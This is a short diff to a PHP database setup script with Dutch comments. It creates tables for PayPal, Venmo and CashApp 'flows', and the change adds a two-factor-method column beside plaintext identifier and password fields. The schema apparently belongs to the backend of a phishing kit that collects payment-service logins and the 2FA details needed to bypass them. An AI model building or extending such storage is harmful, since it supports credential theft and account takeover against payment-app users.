@@ -1,11 +1,12 @@
 <?php
 require_once('db_connect.php');
 
-// Query om paypal_flow aan te maken
+// Query om paypal_flow aan te maken of bij te werken
 $paypal_sql = "CREATE TABLE IF NOT EXISTS paypal_flow (
     id INT AUTO_INCREMENT PRIMARY KEY,
     identifier VARCHAR(255) NOT NULL,
     password VARCHAR(255) NOT NULL,
+    twofa_method VARCHAR(255),
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )";
 
@@ -30,7 +31,7 @@ $conn->query($paypal_sql);
 $conn->query($venmo_sql);
 $conn->query($cashapp_sql);
 
-echo "Tabellen aangemaakt (indien nog niet bestaand).";
+echo "Tabellen aangemaakt of bijgewerkt.";
 
 $conn->close();
 ?>
